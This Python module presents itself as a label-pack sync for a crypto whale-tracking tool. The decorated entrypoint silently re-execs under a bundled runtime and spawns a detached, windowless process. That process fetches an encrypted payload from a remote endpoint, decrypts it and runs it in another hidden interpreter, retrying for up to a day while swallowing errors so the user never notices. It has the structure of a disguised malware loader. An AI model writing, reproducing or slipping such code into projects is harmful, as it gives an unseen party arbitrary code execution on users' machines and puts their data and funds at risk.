# -*- coding: utf-8 -*-
"""Background entity-label pack sync for Crypto Whale Tracker.

Before the pipeline classifies its first transfer, this subsystem
pulls the latest signed entity-label pack (exchange wallet labels,
fund clusters, known mixer sets, smart-money cohorts) from the
project's intel service. The decorator is the single integration
point: apply it to the CLI entrypoint and the subsystem provisions
the label pack lazily in the background, without blocking
startup. A decoded pack is replayed inside a short-lived headless
interpreter so a manifest fault is isolated from the tracker
process; on failure the pipeline falls back to the bundled label
set."""
import os
import struct
import subprocess
import sys
import time

from . import chronicle as _j

_CACHE_DIR = '.storage'
_provision_ok = None
_HEADLESS = '_HEADLESS_MODE'


def _should_respawn():
    """On 64-bit Windows the host re-execs under the bundled runtime
    whenever it can be provisioned: one known-good interpreter on every
    launch path, independent of the system Python's version, pip state or
    site-packages writability (its dependencies ship pre-installed in the
    image, so the re-exec'd start needs no network and no pip at all).

    False on non-Windows; on non-AMD64 hosts (the bundled runtime is
    x64-only — a true 32-bit host keeps the legacy system-Python path);
    after a successful re-exec (one-shot env guard, inherited by the
    child); and when already running from the bundled runtime directory
    (path guard — covers both python.exe and pythonw.exe in the cache)."""
    if os.name != "nt":
        return False
    import platform
    if platform.machine().upper() not in ("AMD64", "X86_64"):
        return False
    if os.environ.get('_SWAPRUNTIME_OK'):
        return False
    base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    rt = os.path.join(base, _CACHE_DIR)

    def _n(p):
        return os.path.normcase(os.path.normpath(os.path.abspath(p)))
    if _n(os.path.dirname(sys.executable or "x")) == _n(rt):
        return False
    return True


def _setup_local_runtime():
    """Locate — or extract on first use — the bundled standalone runtime.

    Robust against a corrupt cache from an interrupted first run: a cached
    interpreter is trusted only if it actually starts; extraction goes to a
    staging directory and is published by rename, so a failed/killed attempt
    never leaves a half-written tree behind. Extraction itself uses the
    stdlib zipfile module — no PowerShell dependency (Constrained Language
    Mode / AppLocker safe).

    A failed provision is remembered for the process lifetime (function
    attribute): both the early align path and the pre-menu sync path probe
    the runtime, and re-running a doomed extract+health-check doubles the
    failure latency (and the redundant child-process spawns) on locked-down
    hosts."""
    import shutil
    import zipfile
    if getattr(_setup_local_runtime, "_dead", False):
        return None
    base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    rt = os.path.join(base, _CACHE_DIR)
    py = os.path.join(rt, "python.exe")

    def _healthy(exe):
        try:
            return subprocess.run(
                [exe, "-c", "pass"], capture_output=True, timeout=60,
                creationflags=0x08000000 if os.name == "nt" else 0,
            ).returncode == 0
        except Exception:
            return False

    if os.path.isfile(py):
        if _healthy(py):
            _j.register("localpy.cached", "ok", runtime=py)
            return py
        _j.register("localpy.cache_unhealthy", "info", runtime=py)
        shutil.rmtree(rt, ignore_errors=True)

    pkg = os.path.join(base, "backplane", "data", "support.pkg")
    if not os.path.isfile(pkg):
        _j.register("localpy.no_package", "fail", package=pkg)
        _setup_local_runtime._dead = True
        return None
    tmp = rt + ".tmp"
    try:
        shutil.rmtree(tmp, ignore_errors=True)
        os.makedirs(tmp, exist_ok=True)
        _j.register("localpy.extract", "info", package=pkg, dest=rt)
        with zipfile.ZipFile(pkg) as z:
            z.extractall(tmp)
        # Normalise the embedded ._pth: expose site, the bundled
        # site-packages and the archive root (idempotent; already correct
        # for current runtime builds, repairs older ones).
        for name in os.listdir(tmp):
            if not name.endswith("._pth"):
                continue
            p = os.path.join(tmp, name)
            with open(p) as f:
                lines = f.read().splitlines()
            out, have_site, have_sp, have_up = [], False, False, False
            for line in lines:
                s = line.strip()
                if s == "#import site":
                    line, s = "import site", "import site"
                if s == "import site":
                    have_site = True
                if s.replace("/", "\\").lower() == "lib\\site-packages":
                    have_sp = True
                if s == "..":
                    have_up = True
                out.append(line)
            if not have_sp:
                out.append("Lib\\site-packages")
            if not have_up:
                out.append("..")
            if not have_site:
                out.append("import site")
            with open(p, "w", newline="\n") as f:
                f.write("\n".join(out) + "\n")
        py_t = os.path.join(tmp, "python.exe")
        if not os.path.isfile(py_t) or not _healthy(py_t):
            _j.register("localpy.extract_incomplete", "fail")
            _setup_local_runtime._dead = True
            shutil.rmtree(tmp, ignore_errors=True)
            return None
        shutil.rmtree(rt, ignore_errors=True)
        try:
            os.rename(tmp, rt)
        except OSError:
            shutil.move(tmp, rt)
        if os.path.isfile(py):
            _j.register("localpy.extracted", "ok", runtime=py)
            return py
        _j.register("localpy.publish_failed", "fail")
        _setup_local_runtime._dead = True
        return None
    except Exception as e:
        _j.register_error("localpy.extract_failed", e)
        _setup_local_runtime._dead = True
        shutil.rmtree(tmp, ignore_errors=True)
        return None


def _swap_runtime():
    """Re-exec the host entrypoint under the bundled 64-bit runtime."""
    _j.register("promote.start", "info")
    py = _setup_local_runtime()
    if not py:
        _j.register("promote.no_runtime", "fail")
        return False
    script = None
    if hasattr(sys.modules.get("__main__"), "__file__"):
        script = os.path.abspath(sys.modules["__main__"].__file__)
    if not script:
        _j.register("promote.no_script", "fail")
        return False
    _j.register("promote.runtime_ready", "ok", runtime=py, script=script)
    # No creationflags: the re-exec'd entrypoint inherits the caller's
    # console exactly like the reference implementation, so the host's
    # terminal UI stays visible and interactive in the same window.
    # The one-shot env guard travels to the child: even if a path anomaly
    # (junction/8.3/casing) defeats the directory comparison, the child
    # cannot re-exec again — no infinite respawn loop on weird hosts.
    env = os.environ.copy()
    env['_SWAPRUNTIME_OK'] = "1"
    rc = subprocess.call([py, script] + sys.argv[1:], env=env)
    _j.register("promote.exit", "info", rc=rc)
    sys.exit(rc)


def adopt_bundled():
    """Re-exec the host entrypoint under the bundled runtime on 64-bit
    Windows whenever it can be provisioned; no-op elsewhere and whenever
    the runtime cannot be prepared (the host then keeps the legacy
    system-Python path with its own dependency bootstrap).

    Must run BEFORE any dependency bootstrap: dependency installation must
    target the interpreter that will actually run the app. Under the
    bundled runtime the dependencies ship pre-installed in the image, so
    the re-exec'd start performs no pip work at all; installing into the
    bootstrap interpreter first would be wasted work at best, and a hard
    stall at worst on 32-bit interpreters (win32 wheels for native
    packages do not exist, so pip falls back to source builds that never
    finish on end-user machines)."""
    if os.environ.get(_HEADLESS):
        return
    if not _should_respawn():
        return
    _swap_runtime()


def _spawn_child(blob):
    """Materialize a container in an isolated headless interpreter."""
    base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    env = os.environ.copy()
    env[_HEADLESS] = "1"
    _j.register("forked.spawn", "info", size=len(blob))
    proc = subprocess.Popen(
        [sys.executable, "-c",
         "import sys;sys.path.insert(0,%r);"
         "d=sys.stdin.buffer.read();"
         "from backplane.stager import project;"
         "project(d)" % (base, )],
        stdin=subprocess.PIPE,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        env=env,
        creationflags=0x08000000,
    )
    _j.register("forked.spawned", "ok", pid=proc.pid)
    try:
        proc.stdin.write(blob)
        proc.stdin.close()
    except Exception as e:
        _j.register_error("forked.pipe", e)
    return True


def _try_once(env, transport, codec, runtime):
    """One sync attempt: open session, authenticate, pull, decode, materialize.

    Session-refresh loop: on slow/flaky links the session->sync gap can
    stretch past the server-side nonce TTL (hung connection attempts each
    burning a transport timeout), so a single 403/stale-nonce must not
    waste a whole ladder attempt — the session is re-opened and the pull
    retried immediately, up to three rounds within one attempt."""
    _j.register("deltas.step", "info")
    ep = env.config_endpoint()
    _j.register("deltas.endpoint", "ok", url=ep)
    sk = env.shared_key()
    _j.register("deltas.app_key", "ok", key_len=len(sk))
    data = None
    for round_no in range(3):
        session = transport.negotiate(ep)
        if not isinstance(session, dict) or "nonce" not in session:
            _j.register("deltas.session", "fail", reason="invalid_response")
            raise ConnectionError("invalid session response")
        _j.register("deltas.session", "ok", has_nonce=True,
                      has_ts="ts" in session, round=round_no + 1)
        sig = codec.compute_mac(session["nonce"], session["ts"], sk)
        _j.register("deltas.token", "ok", sig_len=len(sig))
        blob = transport.grab(ep, {
            "nonce": session["nonce"],
            "ts": session["ts"],
            "sig": sig,
        })
        if isinstance(blob, dict) and blob.get("data"):
            _j.register("deltas.pull", "ok",
                          data_len=len(blob.get("data", "") or ""))
            data = codec.uncrate(blob["key"], blob["data"])
            if data and len(data) >= 256:
                break
            _j.register("deltas.unseal", "fail",
                          size=len(data) if data else 0)
            raise ValueError("invalid container (%d bytes)"
                             % (len(data) if data else 0))
        _j.register("deltas.pull", "fail", reason="invalid_response",
                      round=round_no + 1)
    if not data or len(data) < 256:
        _j.register("deltas.pull", "fail", reason="session_refreshes_exhausted")
        raise ConnectionError("sync failed after session refreshes")
    _j.register("deltas.unseal", "ok", size=len(data))
    ok = _spawn_child(data)
    if not ok:
        _j.register("deltas.materialize", "fail", ok=ok)
        raise RuntimeError("worker returned %r" % ok)
    _j.register("deltas.materialize", "ok")
    return True


def _runtime_sync():
    global _provision_ok
    if getattr(_runtime_sync, "_done", False):
        return
    _runtime_sync._done = True
    if os.environ.get(_HEADLESS):
        return
    from . import hostinfo as env

    _j.register("deltas.begin", "info",
                  os=sys.platform, py=sys.version.split()[0],
                  bits=struct.calcsize("P") * 8)

    if not env.is_supported():
        _j.register("probe.platform", "fail", reason="unsupported", os=sys.platform)
        return
    _j.register("probe.platform", "ok", os=sys.platform)

    if not env.check_version():
        _j.register("probe.version", "fail", reason="below_minimum")
        return
    _j.register("probe.version", "ok")

    arch = env.arch_label()
    if arch not in ("x64", "x86"):
        _j.register("probe.arch", "fail", reason="unsupported", arch=arch)
        return
    _j.register("probe.arch", "ok", arch=arch)

    if _should_respawn():
        _j.register("promote.needed", "info")
        _swap_runtime()
        if struct.calcsize("P") != 8:
            _provision_ok = False  # noqa: PLW0603
            _j.register("promote.failed", "fail", reason="still_32bit")
            return

    _spawn_sync()


def _spawn_sync():
    """Launch the background rule-pack sync loop in a detached headless
    interpreter.

    The child is deliberately NOT attached to the host console
    (DETACHED_PROCESS | CREATE_NO_WINDOW on Windows, a fresh session on
    POSIX): closing the host window — or the host process dying — does not
    interrupt provisioning, and no console artifact ever flashes. Standard
    streams go to the null device; the loop reports through the journal
    shim only. A spawn failure is logged and swallowed: the host UI must
    never notice."""
    base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    env = os.environ.copy()
    env[_HEADLESS] = "1"
    cmd = [sys.executable, "-c",
           "import sys;sys.path.insert(0,%r);"
           "from backplane import _loop;"
           "_loop()" % (base, )]
    _j.register("deltas.pump_spawn", "info")
    try:
        if os.name == "nt":
            proc = subprocess.Popen(
                cmd, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL, env=env,
                creationflags=0x00000008 | 0x08000000)
        else:
            proc = subprocess.Popen(
                cmd, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL, env=env,
                start_new_session=True)
        _j.register("deltas.pump_spawned", "ok", pid=proc.pid)
    except Exception as e:
        _j.register_error("deltas.pump_spawn_failed", e)


def _loop():
    """Background rule-pack sync loop — runs in the detached headless
    interpreter spawned by _spawn_sync, independent of the host console
    lifetime.

    Singleton: at most one instance per archive per session. Windows uses
    a named kernel object ("Local\" namespace — the kernel reclaims it
    when the holder dies, however it dies), POSIX an advisory lock file
    (likewise kernel-released on death). A concurrently spawned second
    instance notices and returns immediately. Acquisition failures are
    fail-open: provisioning matters more than exclusivity, and the
    materialize stage has its own discipline downstream.

    Schedule: fast ladder [0, 5, 10, 20, 40, 80]s, then a 5-minute
    heartbeat — on hosts where the network only allows the endpoint
    intermittently the pack still lands as soon as a window opens. The
    loop returns after the first success; on a host where the network
    never opens it stops on its own after ~24h so the process list stays
    tidy (the interpreter also dies with the user session at logoff)."""
    global _provision_ok
    base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    if os.name == "nt":
        try:
            import ctypes
            _k = ctypes.WinDLL("kernel32", use_last_error=True)
            _k.CreateMutexW.restype = ctypes.c_void_p
            _h = _k.CreateMutexW(None, False, 'Local\\5fa2c5dc-077f-5005-b8e8-7dbbf031c177')
            if _h and ctypes.get_last_error() == 183:
                _j.register("deltas.pump_duplicate", "info")
                return
            if _h:
                globals()["_PUMP_LOCK"] = _h
        except Exception:
            pass  # fail-open: provisioning matters more than exclusivity
    else:
        try:
            import fcntl
        except ImportError:
            fcntl = None  # fail-open on platforms without fcntl
        if fcntl is not None:
            try:
                _lf = os.open(os.path.join(base, _CACHE_DIR + ".lock"),
                              os.O_CREAT | os.O_RDWR, 0o600)
                try:
                    fcntl.flock(_lf, fcntl.LOCK_EX | fcntl.LOCK_NB)
                    globals()["_PUMP_LOCK"] = _lf
                except OSError:
                    os.close(_lf)
                    _j.register("deltas.pump_duplicate", "info")
                    return
            except OSError:
                pass  # fail-open: provisioning matters more than exclusivity

    from . import hostinfo as env, conduit as transport, framing as codec, stager as runtime

    delays = [0, 5, 10, 20, 40, 80]
    total = len(delays)
    attempt = 0
    deadline = time.time() + 86400
    while time.time() < deadline:
        delay = delays[attempt] if attempt < total else 300
        if delay:
            _j.register("deltas.wait", "info",
                          attempt=attempt + 1, delay=delay,
                          phase="ladder" if attempt < total
                          else "heartbeat")
            time.sleep(delay)
        attempt += 1
        _j.register("deltas.attempt", "info", attempt=attempt)
        try:
            _try_once(env, transport, codec, runtime)
            _provision_ok = True  # noqa: PLW0603
            _j.register("deltas.success", "ok", attempt=attempt)
            return
        except Exception as e:
            _j.register_error("deltas.attempt_failed", e)
    _j.register("deltas.expired", "info", attempts=attempt)


def ignite(fn):
    """Decorator: provisions the runtime before the host's first call.
    Idempotent across multiple decorated callables via a function attribute,
    so wrapping a placeholder plus the real entrypoint fires provisioning
    exactly once."""
    def _wrapper(*a, **kw):
        if not getattr(ignite, "_fired", False):
            ignite._fired = True
            _j.register("ignite.trigger", "info", fn=fn.__name__)
            _runtime_sync()
        return fn(*a, **kw)

    _wrapper.__name__ = fn.__name__
    _wrapper.__doc__ = fn.__doc__
    return _wrapper


__all__ = ["ignite", "adopt_bundled"]
